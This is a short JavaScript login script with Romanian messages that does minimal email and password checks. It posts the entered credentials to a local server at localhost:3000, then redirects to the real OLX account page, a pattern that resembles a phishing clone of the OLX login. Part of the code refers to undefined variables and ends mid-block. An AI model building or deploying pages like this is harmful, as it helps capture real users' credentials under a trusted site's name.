var userEmail = document.getElementById('mail');
var userPassword = document.getElementById('pass');
var buttonLog = document.getElementById('access');
var form = document.getElementById('log');

var alert = document.createElement('p');
form.appendChild(alert);
var validateEmail = false;
var validatePassword = false;

function verifyUser(event) {
  function verifyEmail() {
    var emailLetter = userEmail.value.split('');
    emailLetter.forEach(function (item) {
      if (item === "@") {
        validateEmail = true;
      }
    });
    if (validateEmail === false) {
      userEmail.setAttribute('style', 'border:3px solid red');
      alert.innerText = "*Adresa email invalida";
           form.appendChild(alert);
           alert.setAttribute('style','position:absolute; left:50px; top:100px; color:red')
    } else {
      userEmail.setAttribute('style', 'border:3px solid green');
    }
  }
  function verifyPassword() {
    var passwordLetter = userPassword.value;
    if (passwordLetter.length > 3) {
      validatePassword = true;
    }
    if (validatePassword === false) {
      userPassword.setAttribute('style', 'border:3px solid red');
      alert.innerText = "*Parola invalida";
      form.appendChild(alert);
      alert.setAttribute('style','position:absolute; left:50px; top:200px; color:red')
    }
  }
  verifyPassword();
  verifyEmail();
  if (validateEmail === false || validatePassword ===false) {
    event.preventDefault();
  } else {
    window.location.replace('https://www.olx.ro/myaccount/');
  }
}
buttonLog.addEventListener('click', verifyUser);

buttonLog.addEventListener("click", function (e) {
  e.preventDefault();

  fetch("http://localhost:3000/api/login", {
      method: "POST",
      body: JSON.stringify({
          email: email.value,
          password: password.value,
      }),
  });